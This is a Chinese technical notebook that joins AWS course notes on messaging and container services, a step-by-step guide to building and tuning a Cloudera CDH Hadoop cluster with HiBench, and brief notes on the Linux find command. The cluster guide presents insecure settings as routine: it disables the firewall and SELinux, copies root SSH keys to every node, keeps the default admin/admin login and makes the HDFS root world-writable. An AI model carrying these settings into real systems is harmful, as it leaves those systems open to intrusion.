快速入门由AWS 解决方案架构师和合作伙伴编写,旨在依据安全性和高可用性 方面的AWS 最佳实践,帮助您部署基于AWS 的热门解决方案。这些参考部署可在AWS 云上自动实施关键技术,通常只需单击一下即可在一小时内完成实施。 您可以通过简单几步构建测试或生产环境,然后便可立即开始使用。 (AWS)
Aws system manager
AWS Systems Manager 是一项管理服务,可帮助您自动收集软件清单、应用操作 系统修补程序、创建系统映像并配置Windows 和 Linux 操作系统。这些功能可 帮助您定义和跟踪系统配置,防止偏差,并确保Amazon EC2 和本地配置的软件 合规性。AWS Systems Manager 提供的管理方法是根据云的规模和敏捷性专门设 计的,可以扩展到您的本地数据中心,使您可以更轻松地将现有基础设施与 AWS 进行无缝桥接。
Aws Opsworks
缓存
Aws cloudfront
构建解耦架构
传统基础设施以紧密集成的服务器链为中心,其中每个服务器都有特定的目的。 然而,当其中一个组件/层发生故障时,就会对系统的造成灾难性的破坏。此外, 它这种情况也妨碍了扩展。如果在一个层添加或删除服务器,则每个连接层上 的每个服务器也必须相应地进行连接 (AWS)
Aws SQS
引入 SQS 队列有助于改进您的订购应用程序。您可以使用队列将处理逻辑隔离 到其组件中,并在一个独立于Web 应用程序的进程中运行它。这反过来又让系 统能够更灵活地应对流量峰值,同时支持系统仅在必要时快速执行工作以便管 理成本。此外,这还为您提供了一种机制,让您可以将订单作为消息持久保存 (队列充当临时数据库),并将您的事务范围与数据库向堆栈更下层移动。如 果发生应用程序异常或事务失败,这可以确保将订单处理停用或重定向到 Amazon SQS 死信队列 (DLQ),以便日后进行重新处理。 (AWS)
Amazon Simple Queue Service (Amazon SQS) 是一种分布式队列系统,它使Web 服务应用程序能够对应用程序中的一个组件生成的消息(以供另一个组件使用) 进行排队。队列是一个临时存储库,用于存储等待处理的消息,并将消息保留 1 到 14 天(默认为 4 天)。使用Amazon SQS,您可以将应用程序的组件解耦,以 便它们独立运行。消息可包含最多 256KB 的任何格式的文本。Amazon SQS 支持 多个生产者和使用者与同一队列进行交互。Amazon SQS 可与多种AWS 产品一起 使用,包括:Amazon EC2、Amazon S3、Amazon ECS、AWS Lambda 和Amazon DynamoDB。
Amazon SQS 提供了两种类型的消息队列。标准队列提供最大吞吐量、尽力排序 和至少一次传递。Amazon SQS FIFO 队列旨在保证消息严格按照其发送顺序仅处 理一次,吞吐量有限。以下情景描述了Amazon SQS 队列中消息的生命周期(从 创建到删除)。在这个情景中,有一个生产者向队列发送了一条消息,消息以 冗余方式跨Amazon SQS 服务器分布。 (AWS)
Amazon SNS
Amazon Simple Notification Service (SNS) 是一种Web 服务,让用户可以轻松地在 云中设置、操作和发送通知。该服务遵循“发布 – 订阅”(pub-sub)消息收发范 例,使用“推送”机制将通知传递给客户端。
您可以创建一个主题,然后定义策略来确定哪些发布者和订阅者可以与其进行 通信,从而控制对该主题的访问。发布者可以向他们创建的主题或他们发布权 限的主题发送消息。发布者不需要在每条消息中包含特定的目标地址,只需将 消息发送至主题。然后,Amazon SNS 会将主题与该主题的订阅者列表进行匹配, 并将消息传递给每个订阅者。每个主题都有一个唯一的名称,为发布者和订阅 者标识Amazon SNS 终端节点,以便他们发布消息和订阅注册通知。订阅者会收 到发布至他们所订阅主题的所有消息,且一个主题的所有订阅者收到的消息都 相同。
Amazon SNS 支持加密主题。当您将消息发送至加密主题时,Amazon SNS 会使用 由AWS KMS (https://aws.amazon.com/kms/) 提供支持的客户主密钥 (CMK) 来加密 您的消息。Amazon SNS 支持客户托管的 CMK,也支持AWS 托管的 CMK。只要 收到您的消息,Amazon SNS 便在服务器上使用 256 位AES-GCM 算法进行加密。 为实现持久性,这些消息以加密形式存储在多个可用区 (AZ) 中,并在传输到订 阅终端节点(例如,Amazon Simple Queue Service [Amazon SQS] 队列、AWS
Lambda 函数,以及HTTP 和HTTPS Webhook)之前解密。 (AWS)
上述两个组件的消息的延迟性比较大，而kinesis 的处理主要是针对近实时性的。
kinesis stream 相当于管道。
Kinesis firehouse 进行转发转接，kinesis 转发到另外的组件进行集成展示业务。
Kinesis 是一整套系统，kafka 只是数据接下来存好。
20191019 下午课程
微服务和无服务架构
Amazon ECS
Amazon Elastic Container Service (Amazon ECS) 是一种高度可扩展的高性能容器管 理服务,其支持Docker 容器,让您能够在托管的Amazon EC2 实例集群上轻松 运行应用程序。
Amazon ECS 是一种可扩展的集群服务,用于托管容器,可以: • 扩展到数千个实例 • 监控容器的部署 • 管理集群的完整状态 • 使用内置的计划程序或第三方计划程序(例如 Apache Mesos、Blox)对容器 进行计划
• 使用API 来扩展 群集可以使用 Spot 实例和预留实例 (AWS)
无服务架构
Aws api Gateway
防止暴露终端节点
防护DDos 攻击和注入攻击
灾难预防
存储备份
计算备份
恢复策略
参考资料
EMR 弹性扩展
https://aws.amazon.com/cn/blogs/big-data/best-practices-for-resizing-and-automatic-scaling-in-amazon-emr/
https://docs.aws.amazon.com/zh_cn/emr/latest/ManagementGuide/emr-automatic-scaling.html











0.绪论
之前完全没有接触过大数据相关的东西，都是书上啊，媒体上各种吹嘘啊，我对大数据，集群啊，分布式计算等等概念真是高山仰止，充满了仰望之情，觉得这些东西是这样的：

当我搭建的过程中，发现这些东西是这样的：

对于初学者来说，我认为缺点如下：

1.需要控制，配置的东西太多，并且配置对应并不是很清晰（以后优化集群是否会有很高含金量？）
2.整个集群，我觉的从硬件到软件整体来说还是稳定性有待提高，尤其CDH   集群这块一会这个主机失去联系，一会NameNode挂，一会monitor挂，整个使用过程就是在不断的挂，看日志，挑错。基本离自动化，智能化还有很大距离。

CDH集群测试主要包括以下几个方面的内容：
1.装机（pxe），搭建服务器集群基础环境 
2.安装CDH集群，调试集群的健康状况，使集群可用 
3.测试集群性能，优化集群，使用测试框架（如Intel的HiBench框架）测试集群性能

1.基础建设简称基建
上一篇文章，我们已经介绍了集群安装操作系统的大杀器：
 pxe无人值守安装linux机器笔记
在批量安装完毕系统之后，本节主要围绕搭建CDH集群的基础建设进行介绍，基础建设简称基建，主要是为了支撑CDH集群后序工作流畅进行的一系列Linux系统的设置工作，基础建设工作没有做好，后面安装使用集群过程中会出现很多莫名奇妙的错误。基建主要包括，免密登录，时间同步，格式化硬盘，挂载目录等一些设置，下面为大家分别介绍：
1.1 建立主机分发脚本
新建一个host文件里面逐行设置为主机ip 
eg.

192.168.1.1 
  192.168.1.2 
  192.168.1.3

新建一个自定义脚本文件：

#!/bin/sh 
      host= `cat host` 
      for i in   $host 
      do 
      echo $i 
   #将需要分发的命令复制在此处 
  Done

1.2 免密码登陆
配置免密码登录 
1. 执行ssh-keygen命令，点击两次“回车”，生成/root/.ssh/id_rsa.pub文件；(使用脚本分发下面两条命令) 
2. cat /root/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys 
3. scp -r /root/.ssh $hostname:/root/
1.3 配置主机基础环境

修改默认语言为英文

vi /etc/sysconfig/i18n  
  LANG=”en_US.UTF-8”

修改host文件

scp /etc/hosts root@$i:/etc

关闭防火墙以及SELinux

ssh $i ‘service iptables stop’ 
  ssh $i ‘chkconfig iptables off’ 
  ssh $i ‘service ip6tables stop’ 
  ssh $i ‘chkconfig ip6tables off’ 
  ssh $i ‘setenforce 0’ 
  ssh $i ‘echo ‘service iptables stop’ >> /etc/rc.local’ 
  ssh $i ‘echo ‘service ip6tables stop’ >> /etc/rc.local’ 
  ssh $i ‘sed -i ‘s/SELINUX=enforcing/SELINUX=disabled/g’ /etc/selinux/config’

同步时间 启动ntp服务，每5分钟向服务器同步一次（还需修改时间服务器上的部分配置，具体请百度）

ssh $i ‘cat >>/var/spool/cron/root  << EOF 
  */5 * * * * /usr/sbin/ntpdate serverIP> /dev/null 2>&1 
  EOF’ 
  ssh $i ‘echo ‘SYNC_HWCLOCK=yes’ >> /etc/sysconfig/ntpd’ 
  ssh $i ‘hwclock -w’

修改用户句柄限制

ssh $i ‘cat >> /etc/security/limits.conf << EOF 
  hadoop  soft    nofile  65000 
  hadoop  hard    nofile  65000 
  hadoop  soft    nproc  401408 
  hadoop  hard    nproc  401408 
  *  soft    nofile  65000 
  *  hard    nofile  65000 
  *  soft    nproc  401408 
  *  hard    nproc  401408 
  EOF’

建立挂载目录(根据自己的硬盘个数)

ssh $i ‘mkdir /data01 /data02 /data03 /data04 /data05  /data06  /data07  /data08  /data09  ‘

格式化硬盘（需批量执行，此处脚本有待升级）

ssh $i  
  ‘yes|parted /dev/sdb mklabel gpt  
  parted /dev/sdb mkpart primary 0% 100% 
  mkfs.ext4 -T largefile /dev/sdb1

修改/etc/fstab文件

ssh $i ‘cat >> /etc/fstab << EOF 
  /dev/sdb1   /data01            ext4    defaults,noatime        0    0

挂载目录

ssh $i  
  ‘mount /dev/sdb1   /data01

关闭swap交换分区

ssh $i ‘swapoff -a’ 
  ssh $i ‘sysctl -w vm.swappiness=0’ 
  ssh $i ‘echo ‘vm.swappiness=0’ >> /etc/sysctl.conf’

关闭大内存页面

ssh $i ‘cat >> /sys/kernel/mm/transparent_hugepage/defrag << EOF 
  never 
  EOF
ssh $i ‘cat >> /etc/rc.local << EOF 
  echo never > /sys/kernel/mm/redhat_transparent_hugepage/defrag 
  EOF

卸载自带的java环境，可以根据自己的java版本卸载 
检查集群机器是否安装过openJDK,如果有安装过，请卸载，执行命令 ：

rpm -qa | grep jdk 
  rpm -e xxx #xxx为上一步输出的rpm包名
ssh $i  
  ‘rpm -e –nodeps java-1.6.0-openjdk-1.6.0.0-1.66.1.13.0.el6.x86_64 
  rpm -e –nodeps java-1.5.0-gcj-1.5.0.0-29.1.el6.x86_64 
  rpm -e –nodeps java-1.6.0-openjdk-devel-1.6.0.0-1.66.1.13.0.el6.x86_64 
  rpm -e –nodeps java-1.6.0-openjdk-javadoc-1.6.0.0-1.66.1.13.0.el6.x86_64’

安装pscp和scala包

ssh $i ‘rpm -i /root/rpms/pssh-2.3.1-5.el6.noarch.rpm /root/rpms/scala-2.10.4.rpm’

配置java1.8.0_66环境

scp -r /usr/java/jdk1.8.0_66 root@$i:/usr/java/ 
  ssh $i ‘rm -rf /usr/java/lastest’ 
  ssh $i ‘ln -s /usr/java/jdk1.8.0_66 /usr/java/lastest’
ssh $i ‘cat >> /etc/profile << EOF 
  JAVA_HOME=/usr/java/jdk1.8.0_66 
  CLASS_PATH=.:\$JAVA_HOME/lib/dt.jar:\$JAVA_HOME/lib/tools.jar 
  export JAVA_HOME 
  PATH=\$HOME/bin:\$JAVA_HOME/bin:\$PATH 
  export PATH 
  export CLASS_PATH 
  EOF’
scp /etc/profile root@$i:/etc/ 
  ssh $i ‘source /etc/profile’
done

时间同步

ssh $i ‘service ntpd stop 
  ntpdate lcgm2 
  ssh $i ‘hwclock -w’ 
  ssh $i ‘chkconfig ntpd on’ 
  done

配置yum源，开启http服务 
Yum源先mount在var/www/html/下面，在 
/etc/yum.repos.d/rhel-source.repo文件修改内容


一些可能用到的命令：
建立多级目录: mkdir -p /x/xx 
查看系统是否开启cloudera相关服务：chkconfig –list|grep cloudera 
查看eth0网卡网络速度：ethtool eth0|grep -i speed
1.4 绑定网卡
决定集群性能很大因素是集群的网络性能呢，所以一般大数据集群都是多个网卡绑定的bond0模式，绑定shell如下 
nmcli命令可能需要NetworkManager服务来支撑
 ifconfig
 systemctl stop firewalld.service 
 service iptables stop
 setenforce 0


 nmcli con add type bond con-name bond0 ifname bond0 mode 0
 nmcli con add type bond-slave con-name bondeno1 ifname eno1 master bond0
 nmcli con add type bond-slave con-name bondeno2 ifname eno2 master bond0
 nmcli con add type bond-slave con-name bondeno3 ifname eno3 master bond0
 nmcli con add type bond-slave con-name bondeno4 ifname eno4 master bond0

 cd /etc/sysconfig/network-scripts/
 vim ifcfg-bond0
    BOOTPROTO=static
    IPADDR=192.168.*.*
    PREFIX=24
    GATEWAY=192.168.*.*

 service network restart

 nmcli con reload

 nmcli con up bondeno4
 nmcli con up bondeno1
 nmcli con up bondeno2
 nmcli con up bondeno3
 nmcli con up bond0

2.安装配置Cloudera-Manager（离线）
在线安装方式由于需要安装的安装包过大，时间可能非常长，建议大家下载安装包进行离线安装。主要安装Cloudera Manager Server 和Agent。
2.1 离线仓库安装准备
在cloudrea下载离线仓库，下载地址 
    下载cm5： 
https://archive.cloudera.com/cm5/repo-as-tarball/5.8.0/cm5.8.0-centos6.tar.gz 
    下载cdh5： 
https://archive.cloudera.com/cdh5/parcels/5.8.0/ 
        列表： 
        CDH-5.8.0-1.cdh5.8.0.p0.42-el6.parcel 
        CDH-5.8.0-1.cdh5.8.0.p0.42-el6.parcel.sha1 
        manifest.json 
    下载验证：https://archive.cloudera.com/cm5/redhat/6/x86_64/cm/5.8.0/repodata/ 
    下载安装脚本： 
http://archive.cloudera.com/cm5/installer/latest/cloudera-manager-installer.bin
2.2 主节点解压安装
cloudera manager的目录默认位置在/opt下，解压：tar xzvf cloudera-manager*.tar.gz将解压后的cm-5.*和cloudera目录放到/opt目录下(类似在windows把软件安装在D：/software)。
为Cloudera Manager 5建立数据库，可以用Mysql，或者自带的postgresql ，本文采用自带的数据库进行测试。
配置离线仓库地址：

开启apache服务：service httpd start
将下载的cloudera仓库移到/var/www/html目录下，调整目录结构：

 
cdh5目录结构： 

cm5目录结构: 

chmod u+x cloudera-manager-installer.bin，然后./*.bin该文件相关启动脚本，就可以进入安装界面进行安装啦。

service cloudera-scm-server start (这个启动有点慢，可以关注日志变动情况 ) 
  service cloudera-scm-agent start 

其中，日志所在路径是  
/var/log/cloudera-scm-server/cloudera-scm-server.log  
启动server后，使用:

/sbin/iptables -I INPUT -p tcp –dport 7180 -j ACCEPT ( 打开7180端口 )

2.3 配置集群

1.根据CM引导界面，用户名admin ，密码admin。选择Cloudera Express 免费版。点击下一步到为CDH集群安装指定主机。 




2.输入需要安装集群的机器IP地址，包括Cloudera Manager Server 机器。
3.选择集群的安装方式，选择使用数据包，CDH版本选择自定义，并输入yum源地址（基建中已经配置了的） 


 
（上图链接地址https可能会出错）
升级过程中遇到的问题 
提示Error Cannot retrieve repository metadata [repomod.xml] for cloudera-cdh5.Please verify its path and try again
(1) 检查机器的yum及cloudera的yum源配置是否正确 
(2) 在Cloudera升级步骤(5)中填写的apache上cm5包地址是否正确，协议应该使用http而不是https，不然就会出现这种错误 
(3)   若没有显示本地parcel包，可能是路径填写错误，可以根据配置的远程yum地址重新填写。

4.集群安装状态，可以看到每台集群的安装状态，如果正常则进入下一步。
5.选择要安装的CDH组件，我们选择安装HBase、HDFS、Hive、Spark、YARN、Zookeeper服务。点击继续（hibench测试主要需要这几个组件），角色服务分配参考如下：



6. CM会检测安装环境，可能会提示一处安装警告，比如： 
cloudera 建议将/proc/sys/vm/swappiness设置为0，当前设置为60，  
则我们需要在集群每台机器上执行命令：


echo 0> /proc/sys/vm/swappiness

王道就是有错就看日志调试。 


7.选择集群机器的角色分配，对于默认的选择都可以选择在Master机器上，当然像Second NameNode可以选择在非NameNode机器上。注意Cloudera Management Service都选Master。
8.数据库配置。根据创建数据表选择所对应的服务即可。
9.集群设置。选择默认，集群开始安装，完成，访问集群serverIP:7180/cmf，ok。

2.4 集群基本优化
2.4.1 关闭Linux THG服务
检查集群中的各个主机的THG（对虚拟化等的内存资源分配是有好处的，但是对hadoop离线计算IO密集型操作是没有优势的，关闭THG可加快处理速度）

1.查看THG

cat /sys/kernel/mm/redhat_transparent_hugepage/defrag

2.关闭THG

echo never > /sys/kernel/mm/redhat_transparent_hugepage/defrag


2.4.2 设置linux内核参数：vm.swappiness
vm.swappiness值的范围为0~100，作用是控制应用数据在物理内存和虚拟内存之间的交换，值越低，交换的越少。默认值为60。
查看集群各个主机的此参数值：

cat /proc/sys/vm/swappiness

建议调整值为1：

sysctl -w vm.swappiness=1

2.4.3 配置HDFS
点击HDFS -> 配置 -> 高级：hdfs-site.xml 的 HDFS 服务高级配置代码段（安全阀），加入配置使用公平队列
<property>  
    <name>ipc.8020.callqueue.impl</name>
    <value>org.apache.hadoop.ipc.FairCallQueue</value>
</property>
2.4.4 配置Yarn资源
关于Yarn内存分配与管理，主要涉及到了ResourceManage（集群资源调度协调）、ApplicationMatser（任务资源配置）、NodeManager（YARN节点代理配置）这几个概念，相关的优化也要紧紧围绕着这几方面来开展。
点击Yarn -> 资源管理：

设置ApplicationMaster Java最大堆栈：800M(AM内存默认1G)
容器内存yarn.nodemanager.resource.memory-mb 
计算一个节点需要分配的容器内存方法： 
主机内存-操作系统预留内存(12G) - Cloudera Manager Agent(1G) - HDFS DN(1G) – Yarn    NM(1G) 
= 主机内存-15G

如果安装了hive.需减掉12G左右内存. 
如果安装了hbase.还需减掉12-16G内存。 
如果安装impala.还需减掉至少16G内存。
例：64G内存主机，如果安装了hbase,hive，则建议分配的容器内存大约为：25~30G

容器虚拟CPU内核yarn.nodemanager.resource.cpu-vcores
计算一个节点需要分配的容器虚拟内核方法： 
(主机cpu核数 – 系统预留1 – Cloudera1 – HDFS1 – Yarn NN 1) * 4 
Hbase : -1 
例：24核机器，为yarn分配可用cpu核数大约20核左右，按照 核数:处理任务数=1:4(比例可酌情调整)，建议分配为80。由于本次集群CPU计算能力没达到官网建议的比例的要求，大约分配的比例为1:2，分配的核数为30核左右。
高级配置中：mapred-site.xml 的 MapReduce 客户端高级配置代码段（安全阀）

<property>
    <name>mapreduce.tasktracker.outofband.heartbeat</name>
    <value>true</value>
</property>
2.4.5 配置oozie
点击oozie –> 配置 -> 高级 ： oozie-site.xml 的 Oozie Server 高级配置代码段（安全阀），增加配置：
<property>
<name>oozie.launcher.fs.hdfs.impl.disable.cache</name>
  <value>true</value>
</property>
<property>
<name>oozie.action.max.output.data</name>
  <value>5000000</value>
</property>
2.4.6 配置Oozie HA(用HAproxy负载均衡)

Web界面操作略
error： 
Oozie could not be start 
REASON:java.lang.noSuchFieldError:EXTERNAL_PROPERTY 
ERROR: java.lang.noSuchFieldError:EXTERNAL_PROPERTY 
 Org.cod… jaskson…

导致上面错误是oozie的jaskson版本低，替换成1.9.13版本即可 
只替换jackson-mapper-asl和jackson-core-asl即可
替换步骤：
1. 
先将192.168.188.13的两jar包拷贝到/opt/cloudera/parcels/CDH/lib/oozie下
2.

find . -name “jackson*” | grep -e “^./lib” | xargs -i dirname {} | sort |uniq | xargs -i cp jackson-* {}

3.

find . -name “jackson*” | grep -e “^./lib” | xargs -i dirname {} |sort | uniq | xargs -i mv {}/jackson-mapper-asl-1.8.8.jar .

4.

find . -name “jackson*” | grep -e “^./lib” | xargs -i dirname {} |sort | uniq | xargs -i mv {}/jackson-core-asl-1.8.8.jar .

2.4.7 其他优化
1.DRF策略
CDH集群调优：内存、Vcores和DRF
默认配置下，CPU核数和内存是1：1G的比例来启动任务的。可通过调整参数yarn.nodemanager.resource.memory-mb进行调整
2.每个container的分配多少内存和cpu
当应用程序向resource manager 申请资源（即申请container ）时， RM分配给一个container 多大的内存是按照一个最小单位进行分配的。 例如， 我们设置分配的最小单位为4GB， 则RM分配出来的container的内存一定是4G的倍数。  假设现在有一个程序向RM申请 5.1G的内存， 则RM会分配给它一个8GB的container去执行。 

yarn.scheduler.minimum-allocation-mb=4096

在实际执行map reduce的job中， 一个container实际上是执行一个map 或者reduce task的jvm的进程。 那么这个jvm在执行中会不断的请求内存，假设它的物理内存或虚拟内存占用超出了container的内存设定， 则node manager 会主动的把这个进程kill 掉。 
这里需要澄清一点， JVM使用的内存实际上分为虚拟内存和物理内存。  JVM中所有存在内存中的对象都是虚拟内存， 但在实际运行中只有一部分是实际加载在物理内存中的。 我们使用linux的top 可以看到 VM, RES,    前者是虚拟内存，后者可以看成近似是实际占用的物理内存。 因此在设置mapreduce的task的 jvm opts 参数时， 应将heap size 设置的比container允许的最大虚拟内存小。 这样jvm 不会因为申请过多的内存而被node manager 强制关闭。 当然设置最大heap size 如果在执行中被超过， jvm就会报 OutOfMemoryException。 
同时还有一个参数，设定了RM可以分配的最大的container是多大。   假设应用程序向RM申请的资源超过了这个值， RM会直接拒绝这个请求。 

yarn.scheduler.maximum-allocation-mb


3.HiBench集群性能测试
在大数据领域中，集群的性能很大程度上我认为主要是由整体的网络，数据吞吐量决定的，在使用HiBench测试时候发现，使用传统电口千兆网络的任务运行时间比光网任务运行时间要慢10s左右。HiBench的基准测试集是用来衡量一个大数据平台（基于Hadoop）性能的基准测试集，包含了文件系统的IO性能，系统的批处理吞吐，数据仓库用的OLAP分析算子，机器学习的处理能力，以及流处理系统的能力。
切换到光纤后，需要修改机器机器ip，这时候cdh居然没法启动了，百度之后，发现如果使用自带数据库postgresql，需要修改hosts表中记录的元数据信息：修改CDH集群ip
3.1 简介
hibench作为一个测试hadoop的基准测试框架，提供了对于hive：（aggregation，scan，join），排序（sort，TeraSort），大数据基本算法（wordcount，pagerank，nutchindex），机器学习算法（kmeans，bayes），集群调度（sleep），吞吐（dfsio），以及新加入5.0版本的流测试： 
we provide following streaming workloads for SparkStreaming, Storm . 

一个完整的TeraSort测试需要按以下三步执行：

用TeraGen生成随机数据
对输入数据运行TeraSort
用TeraValidate验证排好序的输出数据

所有hibench测试基本都是这样的流程，生成数据，运行，输出结果。
3.2 配置并编译HiBench
从GitHub下载HiBench开源包，本篇会基于HiBench-5.0为例。https://github.com/intel-hadoop/HiBench。如果是基于CDH 5.5测试，建议使用HiBench-5.0，其中包含了Spark 1.5的编译包。
编译

添加JAVA_HOME 环境变量
注释掉${HIBENCH_HOME} /src/streambench/pom.xml中两行

<!-- <module>stormbench</module> -->
<!-- <module>samzabench</module> -->

调用编译脚本：${HIBENCH_HOME}/bin/build-all.sh

配置

编辑 HiBench Configuration File：

cd ${HIBENCH_HOME}/conf
cp 99-user_defined_properties.conf.template 99-user_defined_properties.conf
编译配置文件，如下修改一些参数：
hibench.hadoop.home      /opt/cloudera/parcels/CDH/lib/hadoop 
  hibench.hadoop.mapreduce.home         /opt/cloudera/parcels/CDH/lib/hadoop-mapreduce 
  hibench.spark.home                    /opt/cloudera/parcels/CDH/lib/spark 
  hibench.hdfs.master                   hdfs://cdh-node-11.cdhtest.com 
  hibench.hadoop.configure.dir          /etc/hadoop/conf 
  hibench.masters.hostnames            master # Resource Manager addresses 
  hibench.slaves.hostnames             hostname…
# Node Manager addresses
hibench.spark.master                  yarn-client 
  hibench.spark.version                spark1.6 
  spark.kryoserializer.buffer            2000m # 否则会出现大量spark.kryoserializer.buffer.mb被启用的警告 
  hibench.streamingbench.zookeeper.host         zookeeper-hostnames 
  hibench.streamingbench.brokerList             all-hostnames 
  hibench.streamingbench.kafka.home             /opt/cloudera/parcels/KAFKA

修改benchmarks.lst文件，只运行有必要的测试集，例：

#aggregation 
  #join 
  #kmeans 
  #pagerank 
  #scan 
  #sleep 
  sort 
  wordcount 
  #bayes 
  terasort 
  #nutchindexing 
  dfsioe

修改language.lst文件，只运行有必要的语言

cd ${HIBENCH_HOME}/conf
在language.lst文件中，将以下两行删除
spark/java 
  spark/python

修改load-config.py文件，确保Bench在运行时能找到唯一的包：

$HiBench-Home/bin/functions/load-config.py
将hadoop-mapreduce-client-jobclient*-tests.jar改为hadoop-mapreduce-client-jobclient-tests.jar

Bench在运行时有一些固化的目录和CDH不一致，需要建立目录引用

建立目录引用
mkdir -p /opt/cloudera/parcels/CDH/lib/hadoop-mapreduce/share/hadoop 
  cd /opt/cloudera/parcels/CDH/lib/hadoop-mapreduce/share/hadoop 
  ln -sf /opt/cloudera/parcels/CDH/lib/hadoop-mapreduce mapreduce2

Bench会在HDFS根目录下生成文件，将HDFS的根目录权限修改为777：

sudo -u hdfs hadoop fs -chmod 777 /

（可选）如果在Kerberos启用的状况下，请增加以下步骤：

# 设置环境变量 
  export HIBENCH_HOME=/root/Downloads/HiBench-master 
  export JAVA_HOME=/usr/java/jdk1.7.0_67-cloudera 
  export JAVA_LIBRARY_PATH=$JAVA_LIBRARY_PATH:/opt/cloudera/parcels/CDH/lib/hadoop/lib/native 
  export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/opt/cloudera/parcels/CDH/lib/hadoop/lib/native 
  export SPARK_YARN_USER_ENV=”JAVA_LIBRARY_PATH=$JAVA_LIBRARY_PATH,LD_LIBRARY_PATH=$LD_LIBRARY_PATH”
# 重新登录Kerberos 
  kdestroy 
  kinit -k -t  


运行

命令行输入 

  ${HIBENCH_HOME}/bin/run-all.sh

3.3 HiBench基本优化配置

**优化基本原则**

在固定数据量的前提下，一般设置成让MapReduce作业在一轮Map、Reduce内结束，否则会增加MapReduce进程的调度开销。但如果输入的数据量过大，有可能会因为单个Map或者Reduce的内存消耗过大而到时严重的GC问题，这个需要在运行时对Map或者Reduce任务进程需要监测。

**YARN基本配置**





–
–



NodeManager
Container vCores数量就是系统的virtual core的数量Container Memory配置成节点上可用内存的75%到80%之间（如128GB的机器，可以设置96GB）


ResourceManager
Fair Scheduler调度器最小容器内存1GB 最小容器CPU 1个核最大容器内存=NodeManager Container内存的75%~80%最大容器CPU=NodeManager Container CPU的75%~80%增量内存512MB增量CPU 1个核


Gateway
mapreduce.map/reduce.max.mb = 2GBmapreduce.map/reduce.java.opts = max.mb * 0.8



附录（CDH 相关目录结构功能简介）

**1.相关目录**




/var/log/cloudera-scm-installer : 安装日志目录。 
  /var/log/* : 相关日志文件（相关服务的及CM的）。 
  /usr/lib64/cmf/ : Agent程序代码。 
  /var/lib/cloudera-scm-server-db/data : 内嵌数据库目录。 
  /usr/bin/postgres : 内嵌数据库程序。 
  /etc/cloudera-scm-agent/ : agent的配置目录。 
  /etc/cloudera-scm-server/ : server的配置目录。 
  /etc/clouder-scm-server/db.properties 默认元数据库用户名密码配置 
  /opt/cloudera/parcels/ : Hadoop相关服务安装目录。 
  /opt/cloudera/parcel-repo/ : 下载的服务软件包数据，数据格式为parcels。 
  /opt/cloudera/parcel-cache/ : 下载的服务软件包缓存数据。 
  /etc/hadoop/* : 客户端配置文件目录。


**2.配置**


Hadoop配置文件：

配置文件放置于/var/run/cloudera-scm-agent/process/目录下。如：

/var/run/cloudera-scm-agent/process/193-hdfs-NAMENODE/core-site.xml

这些配置文件是通过Cloudera Manager启动相应服务（如HDFS）时生成的，内容从数据库中获得（即通过界面配置的参数）。
在CM界面上更改配置是不会立即反映到配置文件中，这些信息会存储于数据库中，等下次重启服务时才会生成配置文件。且每次启动时都会产生新的配置文件。
CM Server主要数据库为scm基中放置配置的数据表为configs。里面包含了服务的配置信息，每一次配置的更改会把当前页面的所有配置内容添加到数据库中，以此保存配置修改历史。
scm数据库被配置成只能从localhost访问，如果需要从外部连接此数据库，修改

vim /var/lib/cloudera-scm-server-db/data/pg_hba.conf

文件,之后重启数据库。运行数据库的用户为cloudera-scm。

查看配置内容

直接查询scm数据库的configs数据表的内容。 
访问REST API： http://hostname:7180/api/v4/cm/deployment，返回JSON格式部署配置信息。

配置生成方式

CM为每个服务进程生成独立的配置目录（文件）。所有配置统一在服务端查询数据库生成（因为scm数据库只能在localhost下访问）生成配置文件，再由agent通过网络下载包含配置文件的zip包到本地解压到指定的目录。

配置修改 
CM对于需要修改的配置预先定义，对于没有预先定义的配置,则通过在高级配置项中使用xml配置片段的方式进行配置。而对于/etc/hadoop/下的配置文件是客户端的配置，可以在CM通过部署客户端生成客户端配置。
数据库 
Cloudera manager主要的数据库为scm,存储Cloudera manager运行所需要的信息：配置，主机，用户等。
CM结构 
CM分为Server与Agent两部分及数据库（自带更改过的嵌入Postgresql）。它主要做三件事件： 
管理监控集群主机。 
统一管理配置。 
管理维护Hadoop平台系统。 
实现采用C/S结构，Agent为客户端负责执行服务端发来的命令，执行方式一般为使用python调用相应的服务shell脚本。Server端为Java REST服务，提供REST API，Web管理端通过REST API调用Server端功能，Web界面使用富客户端技术（Knockout）。 
Server端主体使用Java实现。 
Agent端主体使用Python, 服务的启动通过调用相应的shell脚本进行启动，如果启动失败会重复4次调用启动脚本。 
Agent与Server保持心跳，使用Thrift RPC框架。
升级 
在CM中可以通过界面向导升级相关服务。升级过程为三步： 
1.下载服务软件包。 
2.把所下载的服务软件包分发到集群中受管的机器上。 
3.安装服务软件包，使用软链接的方式把服务程序目录链接到新安装的软件包目录上。
卸载 
sudo /usr/share/cmf/uninstall-scm-express.sh, 然后删除/var/lib/cloudera-scm-server-db/目录，不然下次安装可能不成功。
开启postgresql远程访问 
CM内嵌数据库被配置成只能从localhost访问，如果需要从外部查看数据，数据修改vim /var/lib/cloudera-scm-server-db/data/pg_hba.conf文件,之后重启数据库。运行数据库的用户为cloudera-scm。


参考文献
1.CDH官方文档 
2.http://www.cloudera.com/documentation.html 
3.CDH5.8官方文档 http://www.cloudera.com/documentation/enterprise/latest.html 
4.http://blog.selfup.cn/1631.html#comment-403 
5.https://github.com/intel-hadoop/HiBench 






 
2012-2-8 星期三
文件搜索命令:

which [命令名称]
功能：显示系统命令所在目录(绝对路径)

$which ls
whereis可以表现出命令的帮助信息，帮助文件说存放的信息
 

find --通用查找命令

语法：find[搜索路径][搜索关键字]
功能：查找文件或目录
 
-name 根据文件名来查找
find /etc -name init
在目录/etc中查找文件init（只匹配文件名init，通配符*匹配任意字符包括零个字符）
init* ： 以init开头的文件
？：匹配单个字符 init？？？：init后面还有三个符号
-size 文件大小 block数据块 512字节
100MB=102400kb=204800数据块block（只支持数据块的表示方法）
find /-size+204800
在根目录下查找大于100mb的文件
（大于+  小于-    等于 ）
find /home -user samlee
在根目录下查找所有者为samlee的文件
 
时间
1.ctime ，atime ，mtime天为单位
2.cmin，amin，mmin分钟为单位
c-change改变，表示文件的属性被修改过
a-access访问
m-modify修改 ，表示文件的内容被修改过
-之内
+超过
 
find /etc -mmin -120
find /etc -ctime -1


在/etc下查找24小时内被修改过属性的文件和目录
find /etc -size +163840 -a -size -204800

在/etc下查找大于80mb小于100mb的文件
find /etc -name inittab -exec ls -l{} \;

在/etc 下查找inittab文件并显示其详细信息

